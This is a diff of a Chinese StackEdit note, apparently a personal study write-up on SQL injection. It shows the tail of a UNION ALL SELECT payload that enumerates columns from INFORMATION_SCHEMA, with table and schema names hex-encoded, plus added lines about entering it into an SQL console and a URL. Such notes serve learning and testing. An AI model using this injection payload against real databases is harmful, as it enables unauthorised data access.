@@ -111,11 +111,12 @@ UNION ALL SELECT
 				FROM INFORMATION_SCHEMA.COLUMNS 
 					WHERE table_name=0x75736572 AND table_schema=0x73716c5f696e6a656374696f6e-- -'
 ```
-输入到
+输入到 sql 界面和 url 中看一下
 
 ![输入图片说明](/imgs/2023-05-09/aZEYcET0fibvIxmj.png)
 ![输入图片说明](/imgs/2023-05-09/Ws9GriQLjU8FiXxu.png)
 
+可以看到该语句
 
 
 
@@ -135,7 +136,7 @@ UNION ALL SELECT
 > Written with [StackEdit中文版](https://stackedit.cn/).
 >
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTQzMzMwNzE0NiwxMTc3MTA3ODI5LDI4MD
+eyJoaXN0b3J5IjpbLTg1ODc4Mjk1OCwxMTc3MTA3ODI5LDI4MD
 c4NDQ1MywxMTcwMzQ1ODk5LC0xNzExMzMyODU4LDc5NjI4MzEw
 OCw4ODk4MzI1OTQsMTgwMzUwMTQ4NiwtNjc0NjU0OTU4LDE1OD
 kwNDg1ODksLTE4NTg4NjI5NTcsLTE1NjYzNTQxNzAsMjcxOTkw
